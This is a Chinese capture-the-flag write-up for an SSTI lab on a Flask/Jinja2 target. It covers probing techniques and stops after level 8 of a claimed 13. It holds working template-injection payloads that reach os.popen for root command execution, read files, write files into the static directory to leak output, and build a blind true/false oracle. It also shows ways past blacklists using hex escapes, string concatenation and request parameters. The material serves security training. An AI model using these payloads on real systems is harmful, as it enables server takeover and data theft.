# SSTILab 13 关 WP（从 0 探测版）

> 实例：`http://node5.anna.nssctf.cn:24643`（NSSCTF 动态下发，几小时回收，端口会变）
> 环境：Werkzeug/2.0.1 + Python/3.9.6 + Flask 1.1.1
> 结果：**13 / 13 关通过**，本文每一条"实测"都是真实发出去的请求与响应
> 配套：`sstilab_solve.py`（13 关最短 payload，换实例直接重跑）
>
> **复制提示**：表格里为了让竖线正常显示，原文写的是 `|`（markdown 表格的转义）。
> **从渲染后的页面复制**得到的就是正确的 `|`；如果从原始 .md 文本里复制，记得去掉反斜杠。
> 带反斜杠会让 Jinja2 语法报错，靶机回 `No this level`（而 `Hello WAF` 才是被过滤拦了）。
> 正文里的 payload 都放在代码块中，不受这个影响，可直接复制。

> 每关的「从头开始」小节：每一步的判定（被拦 / 报错 / 通过）在本机用**靶机同款黑名单**复刻验证
> （靶机实例回收后无法再直连）；最终 flag 结果为**靶机实测**。

## 零、探测方法：先搞清楚"信号长什么样"

### 0.1 这个靶机只有四种响应

| 响应 | 含义 | 来源 |
|---|---|---|
| `Hello <内容>` | 渲染成功，结果可见 | 外层拼接后渲染 |
| `Hello WAF` | 被黑名单拦 | 关卡函数返回 `"WAF"` |
| `Hello No this level` | 模板报错（语法/运行时异常） | 外层 try/except |
| `Hello correct` / `Hello wrong` | 只回 1 bit（第 3 关专属） | 关卡函数丢弃渲染结果 |

判断"某个字符/词是否被禁"的方法：发一个只依赖它的探针，看回的是 `WAF` 还是别的：

```text
Hello WAF        -> 被过滤了
No this level    -> 报错（语法/运行时），说明没被过滤
Hello <内容>      -> 放行，且能读到内容
```

### 0.2 探针手册（每条探针在问什么）

**A. 入口与引擎**

| 探针 | 它在问什么 | 实测读数 | 用在哪 |
|---|---|---|---|
| `{{7*7}}` | 输入进模板了吗 | `49` = 进了；`WAF` = 这个容器被拦；`correct` = 进了但输出被丢；原样回显 = 没进模板 | 所有关的第一步 |
| `{{7*'7'}}` | 是哪种模板引擎 | `7777777` = Jinja2（Twig 会给 `49`） | 决定能不能用 `|attr`、`dict()` 这类 Jinja 特性 |
| `{% print(7*7) %}` | 语句块容器能用吗 | `49` = 能用 | 第 2 关的决定性探针 |

**B. 字符黑名单（每条只带一个特征字符）**

| 探针 | 它在问什么 | 实测读数 | 决定性于 |
|---|---|---|---|
| `{{ 'q' }}` / `{{ "q" }}` | 引号能写字面量吗 | `WAF` = 被拦 | 第 5、11、12、13 关 |
| `{{ a_b }}` | 下划线 | `WAF` = 被拦；空 = 放行（只是个未定义名字） | 第 6、12、13 关 |
| `{{ a.b }}` | 点号 | `No this level` = 放行（未定义对象取属性才报错） | 第 7、11、12、13 关 |
| `{{ [1] }}` | 中括号 | `WAF` = 被拦 | 第 4、11、12、13 关 |
| `{{ 1+1 }}` | 加号 | `WAF` = 被拦 | 第 11、13 关 |
| `{{ 0 }}` | 数字 | `WAF` = 被拦 | 第 9、12 关 |
| `{{ true }}` | 布尔字面量可用吗 | `True` = 可用 | 第 12、13 关（数字没了，靠它占位） |
| `{{ 'a'~'b' }}` | 拼接运算符 | `WAF`，但这个探针**同时带引号**，要交叉对照才能定论 | 第 8、11、12 关 |

**C. 起点与利用链（问"能力还在不在"）**

| 探针 | 它在问什么 | 实测读数 | 决定性于 |
|---|---|---|---|
| `{{ lipsum }}` | 起点还在吗 | `<function generate_lorem_ipsum …>` | 所有关；第 9、12 关还靠它绕开数字探容器 |
| `{{ lipsum.__globals__|length }}` | 主链第一跳通不通 | `56` = 通 | 第 6、7、8 关靠它**被拦**定位（下划线 / 点号 / `global`） |
| `{{ lipsum|attr('__globals__')|length }}` | `attr` 这条腿通不通 | `56` | 第 7 关（和上一条同为 56 → 两种写法取到同一个字典） |
| `{{ lipsum.__globals__.os }}` | 模块里有 os 吗 | `<module 'os' from '/usr/local/lib/python3.9/os.py'>` | 第 1 关 |
| `…os.popen('id').read()` | 能执行命令吗、什么权限 | `uid=0(root) gid=0(root) groups=0(root)` | 所有关；**第 3 关外带的前提**（可写） |
| `…os.popen('ls -la /app').read()` | 有可写且可读的目录吗 | 看到 `static`、`flag` | **第 3 关外带目标的选择** |

**D. 机制与读数（问"特殊设定"）**

| 探针 | 它在问什么 | 实测读数 | 决定性于 |
|---|---|---|---|
| `{{ config }}` / `{{ self }}` | 这两个名字还在吗 | `None` / `None` = **被预置置空** | 第 10 关（唯一能直接抓到这条设定的探针） |
| `{{ request }}` | 参数通道在吗 | `<Request 'http://…' [POST]>` = 在；`WAF` = 断 | 第 11 关（断）对第 12 关（在） |
| `{{ dict(a=1)|first }}` | 能"就地造字符串"吗 | `a` = 能 | **第 11 关的决定性探针**；第 12 关被拦（带数字） |
| `{{ dict(a=true)|first }}` | 数字被禁时能用布尔占位吗 | `a` = 能 | **第 12 关的决定性探针** |
| `{{ lipsum|string }}` | 有现成含特殊字符的字符串吗 | `<function generate_lorem_ipsum at 0x7f6421330b80>` | 第 13 关（里面就有下划线、点号、尖括号） |
| `{{ lipsum|string|list|batch(19)|first|last }}` | 能按位抠出字符吗 | `_` | **第 13 关的决定性探针** |
| `{{ lipsum['\x5f\x5fglobals\x5f\x5f']|length }}` | 转义能过下划线黑名单吗 | `56`（对照：直接写 → `WAF`） | **第 6 关的决定性探针** |
| `{{ lipsum['__glo'~'bals__']|length }}` | 切词能过关键词黑名单吗 | `56`（对照：直接写 → `WAF`） | **第 8 关的决定性探针** |
| 12 个关键词逐个探 | 哪些词进了黑名单 | 全部 `WAF` | 第 8 关；顺带发现 `popen` 含 `open` 也被拦 |

**E. 盲注专用（第 3 关：把"响应差异"本身当探针）**

| 探针 | 它在问什么 | 实测读数 | 用途 |
|---|---|---|---|
| `{{7*7}}` | 渲染结果会回来吗 | `correct`（不是 `49`） | 确认输出被丢弃 |
| `{{` | 坏模板会怎样 | `wrong` | 确认"异常 = wrong"这个信号 |
| `{{ [][0] }}` | 取不存在下标会抛异常吗 | `correct` | 陷阱：LookupError 被吞成 Undefined，不能当假分支 |
| `{{1/0}}` / `{{ [].pop() }}` / `{{ 'a'.nope.x }}` | 能不能造出真异常 | 都是 `wrong` | 可用的假分支信号（三个备选） |
| oracle 条件真 / 假 | 这个 oracle 成立吗 | `correct` / `wrong` | 建立逐位爆破的基础 |

**探针的四条纪律**

1. **一次只带一个特征** —— `{{ [1] }}` 同时带中括号和数字，在第 9 关被拦时无法判断是谁的问题，必须配 `{{ lipsum }}`（无数字）交叉对照才能定论。
2. **结果必须可辨认** —— `{{ lipsum.__globals__ }}` 返回 16204 字符的 dump，人眼判不了；加 `|length` 得 `56`，一眼可读还能横向比较。
3. **"报错"也是有效读数** —— `{{ a.b }}` 回 `No this level`，恰恰证明点号**没有**被禁；三种响应（`WAF` / `No this level` / `Hello <内容>`）含义完全不同。
4. **关键结论必须配对照探针** —— 说"切碎能过"就要同时给"原文被拦"：`['__glo'~'bals__']` → `56` 对 `['__globals__']` → `WAF`。只有对照才能证明是这个变换起的作用。

**两个天然测不准的东西**

1. **反斜杠**：只能写进字符串字面量，所以引号被禁的第 5、11、12、13 关**没法单独测它** —— 这是探针方法的固有盲区。
2. **被预置赋值改掉的名字**：第 10 关能探到 `config=None` / `self=None`（因为关卡是 `set ... None`）；
   如果关卡改成直接删掉，读数会变成空（未定义），那时只能靠对照其它名字来区分"被删"和"名字打错"。
### 0.3 探针设计三原则

1. **探针必须能渲染出可辨认的结果**（否则分不清"被拦"和"报错"）
2. **一次只测一个特征**（整数运算 / 单引号 / 点号 / 下划线 / 关键词……）
3. **先探容器**：两种定界符各发一次；数字被禁的关卡（第 9、12 关）两个都测不出来，
   这时改用无数字探针 `{{ lipsum }}`

### 0.4 通用起手式（六步）

```text
① 确认注入与引擎   {{7*7}} -> 49 ；{{7*'7'}} -> 7777777（Jinja2 会做字符串重复）
② 找现成对象       模板上下文白送的：lipsum / config / request / self
③ 找离开模板的路   函数 -> __globals__ -> 模块 -> os（这一跳就是从模板到 RCE）
④ 逐项探黑名单     容器 -> 字符 -> 关键词，每项一个探针
⑤ 按"被咬的零件"选写法（三抽屉：字符串从哪来 / 属性怎么取 / 结果怎么写）
⑥ 结果怎么带走     响应体 -> 文件副作用 -> 1 bit
```

---

## 一、逐关：探测 → 推理 → payload → 实测

### 第 1 关：无过滤

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{7*7}}                                    -> Hello 49        先确认输入进了模板
第 2 次  {{ lipsum }}                               -> 函数对象        上下文里有现成对象（起点找到了）
第 3 次  {{ lipsum.__globals__|length }}             -> Hello 56        能爬到"定义它的模块"的全局字典
第 4 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello SSTILAB{...}   拿到 flag
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 所有 SSTI 的第一步：确认输入有没有被当模板执行 | `Hello 49` | 进来了（如果原样显示 `{{7*7}}` 就说明没进模板）→ 可以往下挖 |
| 2 | 既然能执行，先看"模板里现成有什么对象"能用 | 函数对象 | 上下文里有 `lipsum`（Jinja2 自动给的），这就是起点 |
| 3 | 想知道能不能从"一个函数"爬到"它所在模块的全局空间" | `Hello 56` | 能通 —— `__globals__` 就是这条路的关键跳板 |
| 4 | 那个模块顶部 `import os`，直接拼完整链 | flag | 成功；`read()` 不能省，不然没有回显 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{7*7}}` | `Hello 49` | 输入被当模板执行了（若原样回显 `{{7*7}}` 就说明只是当文本输出）→ 确认有 SSTI，可以往下挖对象 |
| `{{7*'7'}}` | `Hello 7777777` | 字符串能被整数重复 —— 这是 **Jinja2（Python 语义）**的指纹（Twig 会回 49）→ 决定后面能用 `dict()`、`attr` 过滤器、`\x5f` 这些特性 |
| `{{ lipsum }}` | 函数对象 | 上下文里有 Jinja2 自带的全局函数 → **找到起点**：它有 `__globals__`，是通往模块的跳板 |
| `{{ lipsum.__globals__ }}` | 16204 字符的字典 | 函数能爬到"定义它的模块"的全局字典 → 那个模块（jinja2.utils）import 过什么，我们就能用什么 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | 加 length 只为把"没法判读的整块 dump"变成可比对的数字（探针原则：结果必须可辨认）；56 之后还能做"三种写法是否取到同一个字典"的对照 |
| `{{ lipsum.__globals__.os }}` | `<module 'os' …>` | 那个模块里确实有 os → **终点找到了**：拿到 os 就等于拿到命令执行 |
| `popen('id').read()` | `uid=0(root)` | 命令执行成功 + root 权限 → 不只是能读文件，还能**写文件**（第 3 关外带的前提） |
| `popen('ls -la /app')` | `/app`、`static`、`flag` | 知道 flag 在 `/app/flag`、静态目录叫 `static` → 外带时就写这里 |
| 引号 / 中括号 / 加号 / 下划线探针 | 全部正常 | 字符层面没有任何过滤 → 可以放心用标准的 `['os']` 和引号，不必绕 |
| `{{ a.b }}` | `Hello No this level` | 未定义对象再取属性会**抛异常**（是报错，不是被拦）→ 这个"报错"信号留到第 3 关当盲注的假分支 |

**推理**：无过滤 → 直接走最标准的全局链；`read()` 必须有（`os.system` 没有回显）。

**payload**

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符）

### 第 2 关：禁 `{{`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{7*7}}                                    -> Hello WAF       连最基本的输出都过不去
第 2 次  {% print(7*7) %}                            -> Hello 49        换语句块容器，立刻通了（说明禁的只是 {{ 这个容器）
第 3 次  {% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}   -> Hello SSTILAB{...}
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 先用最普通的输出语法试一遍 | `Hello WAF` | 被拦的不是"表达式"，而是 `{{` 这个**容器** |
| 2 | 换另一种容器（语句块）看还拦不拦 | `Hello 49` | 语句块没被拦 → 过滤只认 `{{` 这个字符串 |
| 3 | 把原来的链塞进语句块的 print 里 | flag | 输出能力没被拿走，只是换了写法 → 等价替换成立 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{7*7}}` | `Hello WAF` | 被拦的不是"表达式"，而是 `{{` 这个**容器** → 该换容器，不是换链子 |
| `{% print(7*7) %}` | `Hello 49` | 语句块容器畅通 → Jinja2 有三种定界符，黑名单只禁了其中一种 |
| 换到语句块后重跑全套探针 | 全部正常 | 只禁 `{{` 这一个字符串 → 原来那条链可以**原封不动**搬进来，只是换个壳 |

**推理**：Jinja2 有三种定界符 —— `{{ }}`（输出表达式）、`{% %}`（语句）、`{# #}`（注释）。
`print` 语句与输出表达式语义等价，只是容器不同。

**payload**

```jinja
{% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（64 字符）

### 第 3 关：盲注（结果不返回）

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{7*7}}                                    -> Hello correct   不是 49 → 渲染结果不返回给我们
第 2 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello correct   命令执行了，但输出被丢掉，看不到 flag
第 3 次  {% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}   -> Hello correct
         GET /static/l3.txt                          -> SSTILAB{...}    改走"副作用"通道 → 拿到 flag
第 4 次  {% if ...startswith('SSTILAB') %}ok{% else %}{{1/0}}{% endif %}  -> Hello correct
         把 SSTILAB 换成 XXXXXXXX                      -> Hello wrong     于是有了 1 bit 的 oracle（连文件都写不了时用）
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 先发个算术，确认注入 | `Hello correct` | 不是 49 → 渲染结果**不返回**给我们 |
| 2 | 既然能执行，就直接发读文件的链，看有没有别的反应 | `Hello correct` | 命令跑了（没报错），但输出被丢弃 → 光靠响应体拿不到数据 |
| 3 | 改变思路：不指望"看"结果，改为让服务器**留下痕迹**（写文件到静态目录） | `Hello correct`，随后 GET 文件得到 flag | 副作用绕开了"不回显"，这是无回显场景的首选 |
| 4 | 万一连文件都写不了，就用"渲染成功/失败"这一 bit 提问 | 条件真→`correct`，假→`wrong` | 得到 oracle：任何是非问题都能编码进去（逐位爆破 flag） |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{7*7}}` | `Hello correct`（不是 49） | 渲染确实发生了，但**结果不回显** → 响应体这条路断了，得另找通道 |
| `{{` | `Hello wrong` | 坏模板 → 抛异常 → wrong → 说明"渲染成功与否"就是唯一的信号 |
| `{{ [][0] }}` | `Hello correct` | 取不存在的下标**不抛异常**（LookupError 被吞成 Undefined）→ 它当不了"假"信号，用它做假分支会永远拿到 correct |
| `{{1/0}}` | `Hello wrong` | 除零真抛异常 → 可以当假分支（条件假时用它制造 wrong） |
| `{{ [].pop() }}` | `Hello wrong` | 方法调用抛 IndexError → 另一个可用假分支（不含数字，禁数字的盲注关能用） |
| `{{ 'a'.nope.x }}` | `Hello wrong` | Undefined 再取属性会抛 → 第三个备选 |
| oracle（条件真） | `Hello correct` | 条件真 → 正常渲染 |
| oracle（条件假） | `Hello wrong` | 条件假 → 抛异常 → **oracle 成立**：任何是非问题都能编码成这 1 bit |
| `popen('id')` | `uid=0(root)` | 有写权限 → 优先走"写文件外带"，比逐位爆破省事得多 |

**推理**：输出不可见 ≠ 代码不执行。两条路：

1. **副作用外带**（2 个请求，优先）：把结果写进静态目录，再用普通 GET 取回
2. **布尔 oracle**（每次 1 bit）：真则 correct、假则 wrong，逐位问

**外带写哪：怎么知道往哪个文件写**

盲关看不到 `ls` 的输出，所以"往哪写"不能靠猜 —— 有三条**看得见**的线索：

| 线索 | 怎么做 | 你看得见的东西 |
|---|---|---|
| 1 页面与源码 | 页面里引用的 `/static/...`（script/link 标签）、源码里的静态目录设置、第 1 关已经 `ls` 到 `/app` 下有 `static` | HTML、源码文本 |
| 2 oracle 盲问 | 用 `correct` / `wrong` 回答"这个目录在不在、能不能写、那个文件在不在" | 1 bit（条件真 = correct） |
| 3 写探针 + HTTP 试读 | 先写一个没用的探针文件，再去 GET 它 | HTTP 200 / 404 |

线索 2 的实测（本地盲关复刻）：

```jinja
{% if lipsum.__globals__['os'].path.isdir('/app/static') %}ok{% else %}{{1/0}}{% endif %}                             -> correct
{% if lipsum.__globals__['os'].access('/app/static', lipsum.__globals__['os'].W_OK) %}ok{% else %}{{1/0}}{% endif %}  -> correct
{% if lipsum.__globals__['os'].path.isfile('/app/flag') %}ok{% else %}{{1/0}}{% endif %}                             -> correct
{% if lipsum.__globals__['os'].path.isdir('/app/不存在') %}ok{% else %}{{1/0}}{% endif %}                             -> wrong（对照组）
```

`os.access(路径, os.W_OK)` 就是在**盲问"我能写这里吗"**；没有最后那行对照组，前面的 correct 说明不了问题。

线索 3 的实测（先写废文件，再试读）：

```jinja
{% set f = lipsum.__globals__['__builtins__']['open']('/app/static/probe.txt','w') %}{% set x = f.write('PROBE-OK') %}
```
```text
写入 -> Hello correct
GET /static/probe.txt    -> HTTP 200  'PROBE-OK'     通道成立
GET /static/nothing.txt  -> HTTP 404                 对照组：路径写错就长这样
```

**200 和 404 的差别就是盲关里的回显**；这一步通过了，再写真 flag 就稳了。

判断顺序（外带写文件的通用四步）：

```text
1. 页面引用 / 源码里的静态目录      —— 不用注入就能看到，最省事
2. oracle 盲问可写性                —— os.path.isdir / os.access(W_OK)，记得加对照组
3. 写探针 + GET 试读                —— 状态码即回显
4. 都不行 → 换通道                  —— 出网 OOB / 时间差 / 写 /tmp 再找别的读点
```

坑：模板里的字符串转义规则和 Python 不一样，**Jinja2 不支持 `r'...'` 原始字符串**：

```jinja
{{ lipsum.__globals__['os'].path.isdir(r'/app/static') }}     -> 报错（回 No this level）
{{ lipsum.__globals__['os'].path.isdir('/app/static') }}      -> 正确（Linux 靶机直接写正斜杠）
{{ lipsum.__globals__['os'].path.isdir('D:\\deepseek\\x') }}  -> Windows 路径用双反斜杠
```
**payload（路线 A：外带）**

```jinja
{% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}
```
然后 `GET /static/l3.txt`

**写法说明：`set` 不是必需的（几种等价的"只执行不输出"写法）**

`{% set x = A %}` 的意思是"把 A 算出来、存进 x，但不显示" —— x 是个垃圾桶变量，没人用它。目的只有一个：**要副作用（把文件写出来），不要回显**。

实测（下面几种都真的写出了文件，页面上也都不显示结果）：

| 写法 | 能用吗 | 包在表达式外的字符数 |
|---|---|---|
| `{{ 表达式 }}` | 能 | 6 |
| `{% do 表达式 %}` | **不能**（Flask 默认没开 do 扩展，报 `Encountered unknown tag 'do'`） | 9 |
| `{% set x = 表达式 %}` | 能 | 14 |
| `{% if 表达式 %}{% endif %}` | 能 | 20 |
| `{% for i in [表达式] %}{% endfor %}` | 能 | 29 |

**关键**：外带命令已经把 stdout 重定向进文件了，所以 `.read()` 返回的是空串 —— 直接用 `{{ }}` 也看不见输出：

```jinja
{{ lipsum.__globals__['os'].popen('cat /app/flag > /app/static/l3.txt').read() }}
```
```text
渲染输出 = ''（空）      文件写成功 = True        ← 与 set 版效果完全一样
```

所以本关用 `set` 只是"写得清楚"，换成 `{{ }}` 一样能写文件、一样通过。

**什么时候 `set` 才是刚需**：

| 场景 | 为什么必须换成 `{% set %}` |
|---|---|
| 第 2 关（禁 `{{`） | `{{` 被黑名单拦了，只能用 `{% set %}` / `{% if %}` / `{% print %}` |
| 结果有值但不想显示 | 比如不重定向的 `popen('id')`，用 `{{ }}` 会把 uid 直接打到页面上 |
| 后面还要复用这个值 | `{% set x = ... %}` 之后可以 `{{ x }}{{ x }}` 用多次 |

**容器选择顺序（越靠前越省字符）**：

```text
1. {{ 表达式 }}                 要回显、或表达式本身返回空     —— 6 字符
2. {% set x = 表达式 %}         不要回显，或 {{ 被禁           —— 14 字符
3. {% if 表达式 %}{% endif %}   只要副作用、不需要变量          —— 20 字符
4. {% print(表达式) %}          要输出但 {{ 被禁               —— 比 set 稍长
5. {% do 表达式 %}              最贴切，但 Flask 默认没开扩展，靶场上用不了
```
**payload（路线 B：oracle）**

```jinja
{% if lipsum.__globals__.os.popen('cat /app/flag').read().startswith('SSTILAB') %}ok{% else %}{{1/0}}{% endif %}
```

**实测**：外带 → `Hello correct`，`GET /static/l3.txt` 得到 `SSTILAB{enjoy_flask_ssti}`（86 字符）

### 第 4 关：禁 `[` `]`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}   -> Hello WAF   最标准的链，被拦
第 2 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello SSTILAB{...}   把 ['os'] 写成 .os → 通过
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 直接发标准链（链上有取键用的中括号） | `Hello WAF` | 中括号被拦了 |
| 2 | 链上只有取键那一处用了中括号，换成点号试 | flag | 通过 → 说明 Jinja2 的点号在"属性取不到"时会**自动改成按键取** |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ [1] }}` | `Hello WAF` | 中括号被拦 → 一个字符就能定位到过滤点 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | 点号也能取**字典的键** → 因为 Jinja2 的点号"先属性、失败再下标" → 链上 `['os']` 可以写成 `.os` |
| `{{ lipsum.__globals__.os.popen('id').read() }}` | `uid=0(root)` | 整条链只换这一处写法就跑通了 → 确认不需要动别的地方 |
| 其余字符探针 | 全部正常 | 只禁这两个字符 → 引号、命令照旧 |

**推理**：Jinja2 的点号是"**先当属性取，失败再按下标取**"。`__globals__` 是 dict，
没有 `os` 这个属性 → 回退到取键。

**payload**

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符，和第 1 关同一条，只是把取键写法换成点号）

### 第 5 关：禁 `'` `"`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}   -> Hello WAF   最标准的链，被拦
第 2 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello WAF   键的写法去掉引号了，但命令那处还带着引号
第 3 次  {{ lipsum.__globals__.os.popen(request.form.cmd).read() }}     -> Hello SSTILAB{...}
         （POST 一并带 cmd=cat /app/flag）                               把命令也换成变量 → 一个引号都不剩
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 标准链，先看被拦成什么样 | `Hello WAF` | 引号被拦 |
| 2 | 先把"键的引号"去掉（把 `['os']` 写成 `.os`） | 仍 `Hello WAF` | 属性名用点号确实不用引号，但**命令那处还带着引号** |
| 3 | 把命令也换成变量（从请求参数取） | flag | 链上所有字符串都不再是"字面量" → 黑名单没有可咬的字符 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ 'q' }}` / `{{ "q" }}` | `Hello WAF` | 引号被拦 → 所有"字符串字面量"写法全废 |
| 含引号的拼接 / attr 探针 | `Hello WAF` | 连拼接也过不去 → 说明被禁的是**引号这个字符**，不是某个函数 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | 属性名用点号写**不需要引号** → 链上真正躲不开引号的地方只剩"命令"那一个 |
| `…popen(request.form.cmd)…` + `cmd=cat /app/flag` | `Hello SSTILAB{…}` | 命令从请求参数取 → 一个引号都不剩就通过 → 结论：**字符串可以"从外部拿"** |

**推理**：数一遍链上"哪里必须写字符串" —— 属性名（点号免引号）、命令（躲不开）。
所以**只需把命令参数化**。

**payload**

```jinja
{{ lipsum.__globals__.os.popen(request.form.cmd).read() }}
```
POST 时带上 `cmd=cat /app/flag`（若要用查询串，把 `request.form.cmd` 换成 `request.args.cmd`）

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（58 字符 + 1 个字段）

### 第 6 关：禁 `_`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello WAF   __globals__ 里有下划线
第 2 次  {{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}   -> Hello SSTILAB{...}   把那个名字写成转义 → 通过
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 用点号版（这时链上只剩 `__globals__` 带下划线） | `Hello WAF` | 下划线被拦 |
| 2 | 把那个名字写成 `\x5f` 转义 | flag | 通过 → 过滤看的是**原文**，而引擎在编译模板时才把转义还原成 `_` |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ a_b }}` | `Hello WAF` | 下划线是禁词 |
| `{{ lipsum.__globals__|length }}` | `Hello WAF` | 说明这个禁词**真的咬到了链子**（`__globals__` 打不出来） |
| `{{ lipsum['\x5f\x5fglobals\x5f\x5f']|length }}` | `Hello 56` | 转义写法通过 → 过滤看的是**原文**，而引擎在编译模板时才把 `\x5f` 还原成 `_` |
| `{{ lipsum['__globals__']|length }}` | `Hello WAF` | 对照：直接写就被拦 → 证明起作用的就是"转义"这一步 |
| `{{ 'q' }}` / `{{ [1] }}` | 正常 | 别的字符都没禁 → **只替换那一个名字**，其余保持最简写法 |

**推理**：链上只有 `__globals__` 带下划线，**只需替换这一个名字**；
`\x5f` 在编译期还原成 `_`，过滤器看的是原文。

**payload**

```jinja
{{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（72 字符，零额外参数）

### 第 7 关：禁 `.`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}   -> Hello WAF   点号被禁
第 2 次  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}   -> Hello SSTILAB{...}   全部改成中括号 → 通过
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 标准链（靠点号把每一步连起来） | `Hello WAF` | 点号被拦 |
| 2 | 把每个点号都改成中括号 | flag | 通过 → 中括号在"下标取不到"时会**自动改成按属性取**，所以连函数属性也能用中括号拿到 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ a.b }}` | `Hello WAF` | 点号被拦 |
| `{{ lipsum.__globals__|length }}` | `Hello WAF` | 主链全靠点号连接 → 整条链写不出来了 |
| `{{ lipsum['__globals__']|length }}` | `Hello 56` | 中括号也能取**函数的属性** → 因为 getitem 失败会反向回退到 getattr → 把点号全换成中括号即可 |
| `{{ lipsum|attr('__globals__')|length }}` | `Hello 56` | 另一条路：attr 过滤器只做 getattr → 但它取字典键时不行（第 11 关会用到这个差别） |

**推理**：`getitem` 对字符串参数会**反向回退到属性** —— 函数不支持下标（TypeError）→
回退到按属性取。所以把每个点号换成中括号即可。

**payload**

```jinja
{{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（69 字符）

### 第 8 关：关键词黑名单

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}   -> Hello WAF   名字里有 global
第 2 次  {{ lipsum['__glo'~'bals__']['os']['popen']('cat /app/flag')['read']() }}   -> Hello WAF   切了 global，但 popen 里还有 open
第 3 次  {{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}   -> Hello SSTILAB{...}   两个词都切碎 → 通过
```

名单：class arg form value data request init global open mro base attr

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 全中括号版先试 | `Hello WAF` | 名字里有 `global`（`__globals__`）被咬 |
| 2 | 把 `__globals__` 切碎成 `'__glo'~'bals__'` | 仍 `Hello WAF` | 说明还有别的词被咬 —— 这次是 `popen` 里的 `open` |
| 3 | 把 `popen` 也切碎成 `'pop'~'en'` | flag | 关键词只查原文，`~` 是引擎拼接的 → 完整词在原文里根本不出现 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| 12 个关键词逐个探 | 全部 `Hello WAF` | 黑名单是**子串匹配** → 名字里只要含这些词就被拦 |
| `{{ lipsum.__globals__|length }}` | `Hello WAF` | `__globals__` 里含 `global` → 被咬 |
| `{{ lipsum['__glo'~'bals__']|length }}` | `Hello 56` | 切碎后通过 → `~` 是引擎拼接的，原文里没有完整的 `global` |
| `{{ lipsum['__globals__']|length }}` | `Hello WAF` | 对照：不切就被拦 |
| `{{ lipsum['__globals__']['os']['popen'] }}` | `Hello WAF` | 还有**第二个词**被咬：`popen` 里含 `open` → 需要再切一处 |

**推理**：`~` 在**渲染期**才拼接 → 黑名单永远看不到完整的 `global`/`open`。
只需切这两个词，其余照旧。

**payload**

```jinja
{{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}
```

